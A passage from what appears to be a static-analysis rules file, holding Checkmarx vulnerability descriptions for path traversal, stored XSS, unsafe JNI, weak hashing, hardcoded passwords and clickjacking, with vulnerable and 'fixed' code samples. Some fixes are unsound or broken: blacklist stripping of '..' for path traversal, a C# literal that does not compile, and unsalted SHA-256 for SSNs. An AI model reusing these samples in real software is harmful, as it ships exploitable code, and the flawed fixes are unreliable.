&lt;li&gt;Deleting critical files, causing a denial of service (DoS).&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses user input in the file path for accessing files on the application server&amp;#8217;s local disk. This enables an attacker to arbitrarily determine the file path.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, avoid depending on user input for file selection.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Accept user input only for the filename, not for the path and folders.&lt;/li&gt;
&lt;li&gt;Ensure that file path is fully canonicalized.&lt;/li&gt;
&lt;li&gt;Explicitly limit the application to using a designated folder that separate from the applications binary folder.&lt;/li&gt;
&lt;li&gt;Restrict the privileges of the application&amp;#8217;s OS user to necessary files and folders. The application should not be able to write to the application binary folder, and should not read anything outside of the application folder and data folder.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class PathTraversal
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text;
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters are removed from the user input before use
      &lt;/h4&gt;&lt;pre&gt;public class PathTraversalFixed
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text.Replace("\", "").Replace("..", "");
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;h4&gt;Potentially hazardous characters are removed from the user input before use&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal_Fixed {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        name = name.replace("/", "").replace("..", "");
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_595</key><name>Stored_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use legitimate access to the application to submit engineered data to the application&amp;#8217;s database. When another user subsequently accesses this data, web pages may be rewritten and malicious scripts may be activated.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from the application&amp;#8217;s database. The data is embedded directly in the page's HTML, causing the browser to display it as part of the web page. This data may have originated in input from another user. If the data includes HTML fragments or Javascript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary database data without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all dynamic data, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Validation is not a replacement for encoding. Fully encode all dynamic data, regardless of source, before embedding it in output. Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;Javascript encoding for server-generated Javascript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or its built-in functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is output to a label&lt;/h4&gt;&lt;pre&gt;public class StoredXss
{
        public string foo(Label lblOutput, SqlConnection connection, int id)
        {
                string sql = "select email from CustomerLogin where customerNumber = @id";
                SqlCommand cmd = new SqlCommand(sql, connection);
                cmd.Prepare();
                cmd.Parameters.AddWithValue("@id", id);
                string output = (string)cmd.ExecuteScalar();
                lblOutput.Text = String.IsNullOrEmpty(output) ? "Customer Number does not exist" : output;
        }
}&lt;/pre&gt;&lt;h4&gt;
The outputed string is Html encoded before it is displayed in the label
      &lt;/h4&gt;&lt;pre&gt;public class StoredXssFixed
{
        public string foo(Label lblOutput, SqlConnection connection, HttpServerUtility Server, int id)
        {
                string sql = "select email from CustomerLogin where customerNumber = @id";
                SqlCommand cmd = new SqlCommand(sql, connection);
                cmd.Prepare();
                cmd.Parameters.AddWithValue("@id", id);
                string output = (string)cmd.ExecuteScalar()
                lblOutput.Text = String.IsNullOrEmpty(output) ? "Customer Number does not exist" : Server.HtmlEncode(output);                
        }
}&lt;/pre&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is rendered to a web-page template&lt;/h4&gt;&lt;pre&gt;function renderUserProfileTable(res, connection, user_id) {
	connection.query('SELECT id,name,description from user WHERE id= ?', [user_id],function(err, results) {
		var table = "&lt;table&gt;"
		table += "&lt;table class='profile-html-table'&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + results[0].name + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + results[0].description + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;/table&gt;"
		res.render("profile", table)
	});
}&lt;/pre&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is encoded and then rendered to a web-page template&lt;/h4&gt;&lt;pre&gt;var htmlencoder = require('htmlencode');

function renderUserProfileTable(res, connection, user_id) {
	connection.query('SELECT id,name,description from user WHERE id= ?', [user_id],function(err, results) {
		var table = "&lt;table&gt;"
		table += "&lt;table class='profile-html-table'&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + htmlencoder.htmlEncode(results[0].name) + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + htmlencoder.htmlEncode(results[0].description) + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;/table&gt;"
		res.render("profile", table)
	});
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Data obtained from the excecution of an SQL command is output to a label&lt;/h4&gt;&lt;pre&gt;public class Stored_XSS {
	public static void XSSExample(Statement stmt) throws SQLException {
		Label label = new Label();
		ResultSet rs;
		rs = stmt.executeQuery("SELECT * FROM Customers WHERE UserName = Mickey");
		String lastNames = "";
		while (rs.next()) {
			lastNames += rs.getString("Lname") + ", ";
		}
		label.setText("Mickey last names are: " + lastNames + " ");
	}
}&lt;/pre&gt;&lt;h4&gt;The outputed string is encoded to hard-coded string before it is displayed in the label&lt;/h4&gt;&lt;pre&gt;public class Stored_XSS_Fix {
	public static void XSSExample(Statement stmt) throws SQLException {
		Label label = new Label();
		ResultSet rs;
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("A", "Cohen");
		sanitize.put("B", "Smith");
		sanitize.put("C", "Bond");
		rs = stmt.executeQuery("SELECT * FROM Customers WHERE UserName = Mickey");
		String lastNames = "";
		while (rs.next()) {
			lastNames += sanitize.get(rs.getString("Lname")) + ", ";
		}
		label.setText("Mickey last names are: " + lastNames + " ");
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1698</key><name>Direct_Use_of_Unsafe_JNI</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Libraries developed in native code do not enjoy many security mechanisms provided by the Java Virtual Machine (JVM) and Runtime Environment (JRE), such as strong typing, managed memory, and array bounds validation. Calling these native libraries can enable an attacker to bypass all these built-in security mechanisms, and exploit additional vulnerabilities in the native library, such as buffer overflows.&lt;/p&gt;
&lt;p&gt;This could in turn allow the attacker to corrupt system memory, modify values, crash the application, or even execute arbitrary code.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Applications often use the JNI framework to call methods in native libraries, instead of implementing directly in Java. Native code does not have the various security protections offered to Java applications, and thus can be vulnerable to several classes of attacks that are not typically relevant for Java applications. This, in turn,&amp;nbsp;can make the application&amp;nbsp;itself vulnerable to several classes of attacks which would not otherwise apply.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&amp;nbsp;- Avoid using native libraries, if at all possible.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Rearchitect the application to enable required functionality to be developed using safer Java APIs, instead of native code.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Do not use JNI calls to an untrusted native library. Explicitly review the native code in depth for potential security flaws and incongruent developer expectations.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Perform data validation on all input before passing to a JNI function call, as appropriate to the specific parameter context; perform validation on any result returned by the function.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Implement error handling around the JNI call, to catch any exceptions that may be caused by the native code.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unsafe Native Code&lt;/h4&gt;&lt;pre&gt;class NativeHardwareCaller {
	private native int hardwareIO (char[] input);
  
  	static {
      	System.loadLibrary("NativeHardwareCaller");
    }
  
  	public int callHardware(HttpServletRequest request) {
      	String hwInput = request.getParameter("hardwareInput");
      	char[] input = input.toCharArray();
      	int result = hardwareIO( input );

      	return result;
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1695</key><name>Stored_Absolute_Path_Traversal</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could define any arbitrary file path for the application to use, potentially leading to:&lt;/div&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;Stealing sensitive files, such as configuration or system files&lt;/li&gt;
&lt;li&gt;Overwriting files such as program binaries, configuration files, or system files&lt;/li&gt;
&lt;li&gt;Deleting critical files, causing a denial of service (DoS).&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses user input in the file path for accessing files on the application server&amp;#8217;s local disk. This enables an attacker to arbitrarily determine the file path.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, avoid depending on user input for file selection.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Accept user input only for the filename, not for the path and folders.&lt;/li&gt;
&lt;li&gt;Ensure that file path is fully canonicalized.&lt;/li&gt;
&lt;li&gt;Explicitly limit the application to using a designated folder that separate from the applications binary folder.&lt;/li&gt;
&lt;li&gt;Restrict the privileges of the application&amp;#8217;s OS user to necessary files and folders. The application should not be able to write to the application binary folder, and should not read anything outside of the application folder and data folder.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class PathTraversal
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text;
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters are removed from the user input before use
      &lt;/h4&gt;&lt;pre&gt;public class PathTraversalFixed
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text.Replace("\", "").Replace("..", "");
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;h4&gt;Potentially hazardous characters are removed from the user input before use&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal_Fixed {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        name = name.replace("/", "").replace("..", "");
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3874</key><name>Inadequate_Encryption_Strength</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Using weak or outdated cryptography does not provide sufficient protection for sensitive data. An attacker that gains access to the encrypted data would likely be able to break the encryption, using either cryptanalysis or brute force attacks. Thus, the attacker would be able to steal user passwords and other personal data. This could lead to user impersonation or identity theft.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a weak algorithm, that is considered obselete since it is relatively easy to break. These obselete algorithms are vulnerable to several different kinds of attacks, including brute force.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Always use strong, modern algorithms for encryption, hashing, and so on.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not use weak, outdated, or obsolete algorithms.&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure you select the correct cryptographic mechanism according to the specific requirements.&amp;#160;&lt;/li&gt;
&lt;li&gt;Passwords should be protected with a dedicated password protection scheme, such as bcrypt, scrypt, PBKDF2, or Argon2.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use SHA-1, MD5, or any other weak hash algorithm to protect passwords or personal data. Instead, use a stronger hash such as SHA-256&amp;#160;when a secure hash is required.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not use DES, Triple-DES, RC2, or any other weak&amp;#160;encryption algorithm&amp;#160;to protect passwords or personal data. Instead, use a stronger encryption algorithm&amp;#160;such as AES&amp;#160;to protect personal data.&amp;#160;&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not use weak encryption modes such as ECB, or rely on insecure defaults. Explicitly specify a stronger encryption mode, such as GCM.&amp;#160;&lt;/li&gt;
&lt;li&gt;For symmetric encryption, use&amp;#160;a key length&amp;#160;of&amp;#160;at least 256 bits.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Weakly Hashed PII&lt;/h4&gt;&lt;pre&gt;string protectSSN(HttpServletRequest req) {
    string socialSecurityNum = req.getParameter("SocialSecurityNo");
    
    return DigestUtils.md5Hex(socialSecurityNum);
}&lt;/pre&gt;&lt;h4&gt;Stronger Hash for PII&lt;/h4&gt;&lt;pre&gt;string protectSSN(HttpServletRequest req) {
    string socialSecurityNum = req.getParameter("SocialSecurityNo");
    
    return DigestUtils.sha256Hex(socialSecurityNum);
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_604</key><name>Use_Of_Hardcoded_Password</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Hardcoded passwords expose the application to password leakage. If an attacker gains access to the source code, she will be able to steal the embedded passwords, and use them to impersonate a valid user. This could include impersonating end users to the application, or impersonating the application to a remote system, such as a database or a remote web service.&amp;#160;&lt;/div&gt;
&lt;div&gt;Once the attacker succeeds in impersonating the user or application, she will have full access to the system, and be able to do anything the impersonated identity could do.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application codebase&amp;#160;has string literal passwords embedded in the source code. This hardcoded value is used either to compare to user-provided credentials, or to authenticate downstream to a remote system (such as a database or a remote web service). &amp;#160;&lt;/div&gt;
&lt;div&gt;An attacker only needs to gain access to the source code to reveal the hardcoded password. Likewise, the attacker can reverse engineer the compiled application binaries, and easily retrieve the embedded password. Once found, the attacker can easily use the password in impersonation attacks, either directly on the application or to the remote system.&amp;#160;&lt;/div&gt;
&lt;div&gt;Furthermore, once stolen, this password cannot be easily changed to prevent further misuse, unless a new version of the application is compiled. Moreover, if this application is distributed to numerous systems, stealing the password from one system automatically allows a class break in to all the deployed systems.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not hardcode any secret data in source code, especially not passwords.&amp;#160;&lt;/li&gt;
&lt;li&gt;In particular, user passwords should be stored in a&amp;#160;database or directory service, and protected with a strong password hash (e.g. bcrypt, scrypt, PBKDF2, or Argon2). Do not compare user passwords with a hardcoded value.&amp;#160;&lt;/li&gt;
&lt;li&gt;Sytem passwords should be stored in a configuration file or the database, and protected with strong encryption (e.g. AES-256). Encryption keys should be securely managed, and not hardcoded.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Hardcoded Admin Password&lt;/h4&gt;&lt;pre&gt;bool isAdmin(String username, String password) {
    bool isMatch = false; 
    
    if (username.equals("admin")) {
        if (password.equals("P@ssw0rd"))
            return isMatch = true;
    }
    
    return isMatch;
}&lt;/pre&gt;&lt;h4&gt;No Hardcoded Credentials&lt;/h4&gt;&lt;pre&gt;bool isAdmin(String username, String password) {
    bool adminPrivs = false;
    
    if (authenticateUser(username, password)) { 
        UserPrivileges privs = getUserPrivilieges(username);
        
        if (privs.isAdmin)
            adminPrivs = true;
    }
    
    return adminPrivs;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3053</key><name>Missing_X_Frame_Options</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Allowing setting of web-pages inside of a frame in an untrusted web-page will leave these web-pages vulnerable to Clickjacking, otherwise known as a redress attack. This may allow an attacker to redress a vulnerable web-page by setting it inside a frame within a malicious web-page. By crafting a convincing malicious web-page, the attacker can then use the overlayed redress to convince the user to click a certain area of the screen, unknowingly clicking inside the frame containing the vulnerable web-page, and thus performing actions within the user's context on the attacker's behalf.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Failure to utilize the "X-FRAME-OPTIONS" header will likely allow attackers to perform Clickjacking attacks. Properly utilizing the "X-FRAME-OPTIONS" header would indicate to the browser to disallow embedding the web-page within a frame, mitigating this risk, if the browser supports this header. All modern browsers support this header by default.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Utilize the "X-FRAME-OPTIONS" header flags according to business requirements to restrict browsers that support this header from allowing embedding web-pages in a frame:&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpFirst" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;!--[endif]--&gt;"X-Frame-Options: DENY" will indicate to the browser to disallow&amp;nbsp;embedding any web-page inside a frame, including the current web-site.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpMiddle" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;!--[endif]--&gt;"X-Frame-Options: SAMEORIGIN" will indicate to the browser to disallow&amp;nbsp;embedding any web-page inside a frame,&amp;nbsp;excluding the current web-site.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpLast" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;!--[endif]--&gt;"X-Frame-Options: ALLOW-FROM https://example.com/" will indicate to the browser to disallow embedding any web-page inside a frame,&amp;nbsp;excluding&amp;nbsp;the web-site listed after the ALLOW-FROM parameter.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Setting the "DENY" Flag on a Response&lt;/h4&gt;&lt;pre&gt;response.addHeader("X-Frame-Options", "DENY");&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4593</key><name>Frameable_Login_Page</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Allowing setting of web-pages inside of a frame in an untrusted web-page will leave these web-pages vulnerable to Clickjacking, otherwise known as a redress attack. This may allow an attacker to redress a vulnerable web-page by setting it inside a frame within a malicious web-page. By crafting a convincing malicious web-page, the attacker can then use the overlayed redress to convince the user to click a certain area of the screen, unknowingly clicking inside the frame containing the vulnerable web-page, and thus performing actions within the user's context on the attacker's behalf.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Failure to utilize the "X-FRAME-OPTIONS" header will likely allow attackers to perform Clickjacking attacks. Properly utilizing the "X-FRAME-OPTIONS" header would indicate to the browser to disallow embedding the web-page within a frame, mitigating this risk, if the browser supports this header. All modern browsers support this header by default.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Utilize the "X-FRAME-OPTIONS" header flags according to business requirements to restrict browsers that support this header from allowing embedding web-pages in a frame:&lt;/p&gt;
